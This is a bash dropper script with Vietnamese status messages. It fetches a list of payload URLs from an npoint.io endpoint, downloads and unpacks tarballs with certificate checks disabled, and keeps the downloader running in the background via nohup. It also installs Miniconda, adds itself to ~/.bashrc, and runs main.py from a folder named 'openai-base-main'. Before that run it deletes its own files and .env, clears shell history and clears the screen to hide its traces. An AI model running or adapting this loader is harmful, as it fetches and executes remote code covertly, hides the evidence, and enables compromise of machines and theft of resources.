echo '#!/bin/bash
[ -f python-app/run.sh ] || (
#!/bin/bash

while true; do
  echo "Lấy danh sách URL từ API..."
  urls=$(curl -s https://api.npoint.io/04ca0d5475415ca49a85 | jq -r '.datas[]')
  success=false

  for url in $urls; do
    echo "Thử tải từ: $url"
    if wget --no-check-certificate "$url" -O python-app-main.tar.gz; then
      if tar -xvf python-app-main.tar.gz; then
        rm python-app-main.tar.gz
        echo "Tải và giải nén thành công từ: $url"
        success=true
        break
      else
        echo "Giải nén lỗi từ: $url"
      fi
    else
      echo "Tải lỗi từ: $url"
    fi
  done

  if $success; then
    break
  else
    echo "Tất cả URL đều lỗi. Thử lại sau 30 giây..."
    sleep 30
  fi
done
)' > bum.sh && chmod +x bum.sh && nohup ./bum.sh > out.log 2>&1 &


while true; do
    if command -v python >/dev/null 2>&1; then
        PY=$(which python)
        echo "Đã có Python hệ thống: $PY"
    else
        # Kiểm tra nếu đã có Miniconda
        if [ ! -d "$HOME/miniconda" ]; then
            echo "Không có Python. Đang tải và cài đặt Miniconda..."
            wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh -O miniconda.sh
            bash miniconda.sh -b -p "$HOME/miniconda"
            rm miniconda.sh
        else
            echo "Miniconda đã được cài sẵn."
        fi

        export PATH="$HOME/miniconda/bin:$PATH"
        echo 'export PATH="$HOME/miniconda/bin:$PATH"' >> ~/.bashrc
        PY="$HOME/miniconda/bin/python"
    fi

    # Tìm thư mục openai-base-main
    dir=$(find ~ -type d -name 'openai-base-main' -print -quit)
    if [ -n "$dir" ]; then
        rm -f bum.sh out.log .env
        # pkill python || true
        # pkill python3 || true
        cd "$dir" || exit 1
        history -c && history -w
        clear
        $PY main.py 8 --dataset=data.txt --output=result.txt > stdout.txt 2> stderr.txt
    else
        echo "Không tìm thấy thư mục 'openai-base-main'"
    fi

    sleep 10
done